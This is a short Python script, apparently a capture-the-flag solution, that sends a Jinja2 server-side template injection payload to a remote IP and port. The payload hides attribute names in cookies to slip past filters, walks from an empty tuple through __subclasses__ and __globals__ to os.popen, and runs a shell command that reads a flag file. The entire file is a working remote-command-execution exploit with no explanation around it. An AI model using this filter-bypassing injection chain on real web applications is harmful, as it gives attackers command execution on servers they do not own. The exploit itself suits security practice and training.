import requests

url = "http://34.185.167.212:31061/"


params = {
    "search_query": "{{()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)()|attr(request.cookies.d)(233)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.d)(request.cookies.g)|attr(request.cookies.h)(request.cookies.i)|attr(request.cookies.j)()}}"
}

cookies = {
    "a": "__class__",
    "b": "__base__",
    "c": "__subclasses__",
    "d": "__getitem__",
    "e": "__init__",
    "f": "__globals__",
    "g": "os",
    "h": "popen",
    "i": "cat /flag23214/flag9292981",
    "j": "read"
}

r = requests.get(url=url, params=params, cookies=cookies)

print(r.text)